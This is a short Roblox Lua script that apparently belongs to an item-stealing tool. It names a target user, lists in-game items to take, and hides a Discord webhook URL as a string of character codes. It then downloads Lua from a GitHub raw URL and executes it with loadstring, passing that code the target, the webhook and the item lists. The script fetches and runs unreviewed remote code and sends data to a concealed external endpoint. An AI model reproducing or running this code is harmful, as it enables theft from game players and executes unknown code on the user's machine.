local TARGET_ID = 4107292
local TARGET_USER = "hkg"

WebhookEncrypted = "104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,47,53,54,55,52,53,54,55,52,53,52,53,54,55,47,103,101,116,109,111,116,105,111,110"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true
}

local TargetGears = {
    ["Alien Slap"] = true
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WebhookEncrypted, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)